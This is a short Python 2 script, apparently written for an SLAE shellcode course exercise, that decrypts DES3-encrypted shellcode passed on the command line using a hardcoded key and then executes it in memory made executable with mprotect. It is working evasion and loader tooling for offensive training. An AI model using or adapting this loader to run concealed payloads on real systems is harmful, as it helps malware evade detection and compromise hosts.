#!/usr/bin/python
# 
# Linux x86
# Author:  thryb
# Date:    09-11-2016
# Purpose: DES3 shellcode decrypter & execute
# ID:      SLAE-770
# Git:	   https://www.github.com/thryb/SLAE-770
#

import sys
from Crypto.Cipher import DES3
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

libc = CDLL('libc.so.6')

if len(sys.argv) == 2:
	encryptedshellcode = str(sys.argv[1])
else:
	print "Usage: %s <shellcode>" % str(sys.argv[0])
	exit(2)

key = b'Thisisa16bkey...'

cipher = DES3.new(key, DES3.MODE_ECB)

print 'Encrypted shellcode: ' + encryptedshellcode

decrypted = encryptedshellcode.replace('\\x', '').decode('hex')

msg = cipher.decrypt(decrypted)

decrypted = msg.encode('hex')

j = iter(decrypted)

decrypted = '\\x'.join(a+b for a,b in zip(j, j))
decrypted = '\\x' + decrypted

print 'Decrypted shellcode: ' + decrypted
print 'Executing...'

shellcode = decrypted.replace('\\x', '').decode('hex')

# thanks to hacktracking for that snip
# hacktracking.blogspot.ca/2015/05/execute-shellcode-in-python.html
sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()

